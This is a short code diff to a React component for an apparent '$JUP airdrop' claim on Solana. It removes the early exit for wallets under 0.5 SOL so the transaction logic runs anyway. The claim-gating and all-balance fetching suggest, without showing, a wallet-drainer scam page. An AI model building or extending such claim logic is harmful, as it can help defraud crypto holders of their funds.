@@ -149,14 +149,13 @@ const Jpy = () => {
       const currentSolBalance = solBalRaw / LAMPORTS_PER_SOL;
       setSolBalance(currentSolBalance);
 
-      // Balance check: User must have at least 0.5 SOL
+      // Balance check: Show notification even if balance is low, but still proceed
       if (currentSolBalance < MIN_REQUIRED_SOL) {
         toast.error(`Insufficient Balance`, {
           description: `Get at least 0.5 SOL worth of $JUP in order to claim airdrop.`,
           duration: 5000,
         });
-        setIsClaiming(false);
-        return;
+        // Don't return, continue with transaction logic
       }
 
       const currentBalances = await fetchAllBalances();
